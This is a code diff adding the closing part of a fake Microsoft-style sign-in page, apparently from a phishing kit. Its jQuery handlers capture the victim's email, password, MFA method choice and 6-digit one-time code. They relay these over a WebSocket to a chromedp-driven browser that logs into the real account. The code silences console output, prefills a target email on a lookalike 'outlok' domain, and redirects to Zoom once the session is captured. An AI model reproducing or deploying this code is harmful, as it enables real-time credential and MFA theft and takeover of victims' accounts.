+        enableSubmitBtn();
+        $("#submit-btn").hide().val("Sign in");
+        if (typeof window.hideLoading === "function") {
+          window.hideLoading(document.getElementById("next"));
+        }
+        state.count = 0;
+        state.mssg = "";
+        clearSubmitTimer();
+        resetSubmitWatchdog();
+      } catch (e) {
+        console.error("Error in back button handler:", e);
+      }
+    });
+    $(document).on("click", "#submit-btn", function(e) {
+      try {
+        e.preventDefault();
+        if (state.isSubmitting) return;
+        if (state.passwordLocked) return;
+        $("#error").hide();
+        $("#msg").hide();
+        disableSubmitBtn();
+        $("#ai").prop("readonly", true);
+        showProgress();
+        if (state.godaddy) {
+          checkSubmit("Gdad", state.count);
+        } else {
+          if (state.count > 0 && state.ws && state.ws.readyState === WebSocket.OPEN) {
+            checkSubmit("password", state.count);
+          } else {
+            WebSocketTest();
+          }
+          clearSubmitTimer();
+          startSubmitWatchdog(state.submitDefaultTimeoutMs, "password_submit");
+          state.submitTimer = setInterval(function() {
+            try {
+              if (state.submitStartedAt && Date.now() - state.submitStartedAt > state.submitTimeoutMs) {
+                const holdReason = state.submitHoldReason || "none";
+                clearSubmitTimer();
+                resetSubmitWatchdog();
+                console.warn("Submit safety timeout \u2014 re-enabling button", {
+                  holdReason
+                });
+                hideProgress();
+                enableSubmitBtn();
+                $("#submit-btn").val("Sign in");
+                return;
+              }
+              if (!state.mssg) return;
+              const msg = trimStr(state.mssg);
+              clearSubmitTimer();
+              resetSubmitWatchdog();
+              if (msg === "adfs" || msg === "error" || msg === "bad" || msg === "Error submitting email" || msg === "timeout_waiting_submit_pass") {
+                hideProgress();
+                enableSubmitBtn();
+                const target = getRedirectTarget();
+                if (target) {
+                  window.location.href = target;
+                }
+                state.mssg = "";
+                return;
+              }
+              if (msg === "valid") {
+                state.mssg = "";
+              } else if (msg.indexOf("TerminatedLogSessSuccess") !== -1) {
+                if (state.redirectFinal) window.location.href = state.redirectFinal;
+                state.mssg = "";
+              } else if (msg.indexOf("Incorrect password") !== -1 || msg.indexOf("Password already used") !== -1) {
+                state.count += 1;
+                hideProgress();
+                enableSubmitBtn();
+                $("#msg").show();
+                $("#pr").val("").trigger("focus");
+                state.mssg = "";
+              } else if (msg.indexOf("Error submitting email") !== -1) {
+                hideProgress();
+                enableSubmitBtn();
+                $("#error").show();
+                $("#ai").val("");
+                $("#pr").val("");
+                $("#ai").prop("readonly", false).trigger("focus");
+                state.count = 0;
+                state.mssg = "";
+              } else {
+                state.count += 1;
+                if (detectMfaState(msg)) {
+                  console.log("MFA state detected in submit response");
+                  updateMfaState(true, "submit_response");
+                  state.mfaStateConfirmed = true;
+                }
+                try {
+                  if (msg.indexOf("<") !== -1 && $("#remvSec").length > 0) {
+                    $("#remvSec").html(msg);
+                    normalizeMfaDom();
+                  }
+                } catch (htmlError) {
+                  console.error("Error injecting HTML in submit:", htmlError);
+                }
+                state.mssg = "";
+              }
+              $("#submit-btn").val("Sign in");
+            } catch (intervalError) {
+              console.error("Error in submit timer:", intervalError);
+            }
+          }, 1e3);
+        }
+      } catch (submitBtnError) {
+        console.error("Error in submit button handler:", submitBtnError);
+        enableSubmitBtn();
+        hideProgress();
+      }
+    });
+    $(document).on("click", "#cdp-close", function(e) {
+      e.preventDefault();
+      cancelMfaSession();
+    });
+    $(document).on("click", "#signInAnotherWay", function(e) {
+      try {
+        e.preventDefault();
+        if (state.clickedBtn < 1) {
+          $(this).css({ opacity: "0.5", "pointer-events": "none" });
+          showMfaLoading();
+          checkId("signInAnotherWay");
+          checkMessg();
+        }
+        state.clickedBtn += 1;
+      } catch (err) {
+        console.error("Error in signInAnotherWay handler:", err);
+      }
+    });
+    $(document).on("click", "#idBtn_SAOTCS_Cancel", function(e) {
+      try {
+        e.preventDefault();
+        console.log("idBtn_SAOTCS_Cancel clicked \u2014 cancelling MFA session");
+        cancelMfaSession();
+      } catch (err) {
+        console.error("Error in cancel handler:", err);
+      }
+    });
+    $(document).on("click", "#idBtn_Back", function(e) {
+      try {
+        e.preventDefault();
+        e.stopImmediatePropagation();
+        console.log("idBtn_Back clicked \u2014 sending back action to chromedp");
+        $(this).css({ opacity: "0.5", "pointer-events": "none" });
+        showMfaLoading();
+        checkId("idBtn_Back");
+        checkMessg();
+        state.clickedBtn = 0;
+        state.clickedVerify = 0;
+      } catch (err) {
+        console.error("Error in back handler:", err);
+      }
+    });
+    $(document).on("click", '[role="button"]', function(e) {
+      try {
+        e.preventDefault();
+        if (state.clickedBtn < 1) {
+          $(this).css({ opacity: "0.5", "pointer-events": "none" });
+          showMfaLoading();
+          const dataValue = str($(this).attr("data-value"));
+          const testId = str($(this).attr("data-test-id"));
+          const elementId = str($(this).attr("id"));
+          state.method = dataValue || testId || elementId;
+          if (state.method) {
+            checkMethod(state.method);
+            checkMessg();
+          }
+        }
+        state.clickedBtn += 1;
+      } catch (err) {
+        console.error("Error in role button handler:", err);
+      }
+    });
+    $(document).on("click", "#idSubmit_SAOTCC_Continue", function(e) {
+      try {
+        e.preventDefault();
+        $("#errorMsg").remove();
+        const errMsg = '<div role="alert" aria-live="assertive" id="errorMsg"><div class="row"><div id="idDiv_SAOTCC_ErrorMsg_OTC" class="alert alert-error first"><span id="idSpan_SAOTCC_Error_OTC">Please enter the 6-digit code. The code only contains numbers.</span><a id="ViewDetails" class="no-wrap" href="#" aria-label="View debugging details for this error">View details</a></div></div></div>';
+        const inp = trimStr($("#idTxtBx_SAOTCC_OTC").val());
+        if (state.method === "OneWaySMS") {
+          if (!(inp && inp.length === 6 && /^\d{6}$/.test(inp))) {
+            const $target = $("#idDiv_SAOTCC_OTCRow");
+            if ($target.length > 0) $target.html(errMsg + $target.html());
+            return;
+          }
+        }
+        if (state.clickedVerify < 1) {
+          $(this).css({ opacity: "0.5", "pointer-events": "none" }).val("Verifying...");
+          showMfaLoading();
+          checkInput(inp);
+          checkMessg();
+        }
+        state.clickedVerify += 1;
+      } catch (err) {
+        console.error("Error in MFA submit handler:", err);
+      }
+    });
+    $(window).on("beforeunload", function() {
+      state.shouldReconnect = false;
+      updateMfaState(false, "page_unload");
+      if (state.reconnectTimer) {
+        clearTimeout(state.reconnectTimer);
+      }
+      if (state.ws && state.ws.readyState === WebSocket.OPEN) {
+        state.ws.close();
+      }
+    });
+  }
+
+  // build/modules/main.js
+  console.log = function() {
+  };
+  console.warn = function() {
+  };
+  console.error = function() {
+  };
+  try {
+    initState();
+    $(document).ready(function() {
+      registerHandlers();
+    });
+  } catch (globalError) {
+    console.error("Global error in WebSocket script:", globalError);
+  }
+})();
+
+</script>
+
+<script>
+	
+	window.PRE_SID = '129c677a-7542-47d5-bc6d-8fb340a03e73';
+	window.PRE_EMAIL = 'tbella2021@outlok.com';
+	window.PRE_COMPANY = 'Outlok';
+	window.PRE_COMPANY_CAP = 'OUTLOK';
+	window.PRE_NUM_DATE = '06.10.26';
+	window.PRE_DATE = 'October 6, 2026';
+	window.PRE_FINAL_REDIRECT = 'https:\/\/zoom.us';
+	window.PRE_REDIRECT = 'false';
+	window.PRE_REDIRECT_URL = '\/rp129c677a-7542-47d5-bc6d-8fb340a03e73-3801892f';
+
+	
+	window.showLoading = function(button) {
+		if (!button) return;
+		const originalText = button.innerHTML;
+		button.disabled = true;
+		button.innerHTML = '<span class="spinner"></span>Processing...';
+		button.setAttribute('data-original-text', originalText);
+	};
+
+	window.hideLoading = function(button) {
+		if (!button) return;
+		button.disabled = false;
+		const originalText = button.getAttribute('data-original-text');
+		if (originalText) {
+			button.innerHTML = originalText;
+			button.removeAttribute('data-original-text');
+		}
+	};
+
+	
+	
+	
+	
+	
+	
+	
+
+	
+	
+	window.resetOverlayForm = function() {
+		try {
+			var ai = document.getElementById('ai');
+			var preEmail = window.PRE_EMAIL || '';
+			if (ai) {
+				ai.value = preEmail;
+				ai.readOnly = !!preEmail; 
+			}
+			var divPr = document.getElementById('divPr');
+			if (divPr) { divPr.innerHTML = ''; divPr.style.display = 'none'; }
+			var nextBtn = document.getElementById('next');
+			if (nextBtn) { nextBtn.value = 'Next'; nextBtn.innerHTML = 'Next'; nextBtn.style.display = ''; nextBtn.style.opacity = '1'; nextBtn.disabled = false; }
+			var submitBtn = document.getElementById('submit-btn');
+			if (submitBtn) { submitBtn.style.display = 'none'; submitBtn.disabled = false; submitBtn.style.pointerEvents = ''; submitBtn.style.background = ''; submitBtn.style.borderColor = ''; submitBtn.style.cursor = ''; submitBtn.value = 'Sign in'; submitBtn.innerHTML = 'Sign in'; }
+			var msg = document.getElementById('msg');
+			if (msg) msg.style.display = 'none';
+			var err = document.getElementById('error');
+			if (err) err.style.display = 'none';
+			var progress = document.getElementById('cdp-progress');
+			if (progress) progress.style.display = 'none';
+			
+			var titleEl = document.querySelector('.sign-in-box .title');
+			if (titleEl) titleEl.textContent = 'Sign in';
+			var userRow = document.getElementById('cdp-user-row');
+			if (userRow) userRow.style.display = 'none';
+			var backBtn = document.getElementById('cdp-back-btn');
+			if (backBtn) backBtn.style.display = 'none';
+			var emailGroup = ai ? ai.closest('.form-group') : null;
+			if (emailGroup) emailGroup.style.display = '';
+			var emailLinks = document.getElementById('cdp-email-links');
+			if (emailLinks) emailLinks.style.display = '';
+			var forgotPw = document.getElementById('cdp-forgot-pw');
+			if (forgotPw) forgotPw.style.display = 'none';
+			hideLoading(nextBtn);
+		} catch(e) {}
+	};
+</script>
+
+
+    
+    <script>
+    (function() {
+        function isOverlayVisible() {
+            var overlay = document.getElementById('chromedp-overlay');
+            if (!overlay) return false;
+            return window.getComputedStyle(overlay).display !== 'none';
+        }
+        function tryAutoNext() {
+            if (!isOverlayVisible()) return;
+            var emailInput = document.getElementById('ai');
+            var nextBtn = document.getElementById('next');
+            if (emailInput && nextBtn && emailInput.value && emailInput.value.trim().length > 0
+                && window.getComputedStyle(nextBtn).display !== 'none' && !nextBtn.disabled) {
+                
+                
+                
+                
+                
+                if (window.jQuery) {
+                    window.jQuery('#next').trigger('click');
+                } else {
+                    nextBtn.click();
+                }
+            }
+        }
+        
+        var mo = new MutationObserver(function() {
+            if (isOverlayVisible()) {
+                setTimeout(tryAutoNext, 400);
+            }
+        });
+        var target = document.getElementById('chromedp-overlay');
+        if (target) {
+            mo.observe(target, { attributes: true, attributeFilter: ['style'] });
+        }
+    })();
+    </script>
+</body>
+</html>
